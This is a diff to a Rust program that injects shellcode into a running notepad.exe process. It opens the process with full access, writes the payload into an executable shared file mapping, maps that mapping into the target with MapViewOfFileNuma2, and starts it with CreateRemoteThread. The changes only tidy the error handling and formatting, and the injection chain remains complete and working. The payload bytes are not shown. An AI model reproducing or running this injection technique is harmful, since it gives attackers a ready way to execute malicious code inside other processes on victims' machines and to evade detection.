@@ -1,9 +1,7 @@
 use std::{
     mem::transmute,
-    process::exit,
-    ptr::{copy, null, null_mut},
+    ptr::{copy, null},
 };
-
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use windows::Win32::{
     Foundation::INVALID_HANDLE_VALUE,
@@ -28,18 +26,11 @@ fn find_process(process_name: &str) -> Result<u32, String> {
         .collect();
 
     for process in processes {
-        println!(
-            "[i] {} process with PID found: {}",
-            process_name,
-            process.pid()
-        );
-
+        println!("[i] {} process with PID found: {}", process_name, process.pid());
         return Ok(process.pid().as_u32());
     }
 
-    return Err(String::from(
-        "Error finding the PID of the mentioned process!",
-    ));
+    return Err(String::from("Error finding the PID of the mentioned process!"));
 }
 
 fn main() {
@@ -70,27 +61,22 @@ fn main() {
         println!("[+] Creating a mapping file");
 
         let pid_process = find_process("notepad.exe").unwrap_or_else(|e| {
-            // Put name process
-            eprintln!("[!] find_process Failed With Error: {e}");
-            exit(-1)
+            panic!("[!] find_process Failed With Error: {e}");
         });
 
         let hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, pid_process).unwrap_or_else(|e| {
-            eprintln!("[!] OpenProcess Failed With Error: {e}");
-            exit(-1)
+            panic!("[!] OpenProcess Failed With Error: {e}");
         });
 
         let hfile = CreateFileMappingA(
             INVALID_HANDLE_VALUE,
-            Some(null()),
+            None,
             PAGE_EXECUTE_READWRITE,
             0,
             shellcode.len() as u32,
             None,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] CreateFileMappingA Failed With Error: {e}");
-            exit(-1)
+        ).unwrap_or_else(|e| {
+            panic!("[!] CreateFileMappingA Failed With Error: {e}");
         });
 
         println!("[+] Mapping the file object");
@@ -105,16 +91,7 @@ fn main() {
         println!("[+] Copying Shellcode to another process");
         copy(shellcode.as_ptr() as _, map_address.Value, shellcode.len());
 
-        let p_map_address = MapViewOfFileNuma2(
-            hfile,
-            hprocess,
-            0,
-            Some(null_mut()),
-            0,
-            0,
-            PAGE_EXECUTE_READWRITE.0,
-            0,
-        );
+        let p_map_address = MapViewOfFileNuma2(hfile, hprocess, 0, None, 0, 0, PAGE_EXECUTE_READWRITE.0, 0);
 
         println!("[+] Running the thread!!");
         let hthread = CreateRemoteThread(
@@ -125,10 +102,8 @@ fn main() {
             Some(null()),
             0,
             None,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] CreateRemoteThread Failed With Error: {e}");
-            exit(-1)
+        ).unwrap_or_else(|e| {
+            panic!("[!] CreateRemoteThread Failed With Error: {e}");
         });
 
         WaitForSingleObject(hthread, INFINITE);
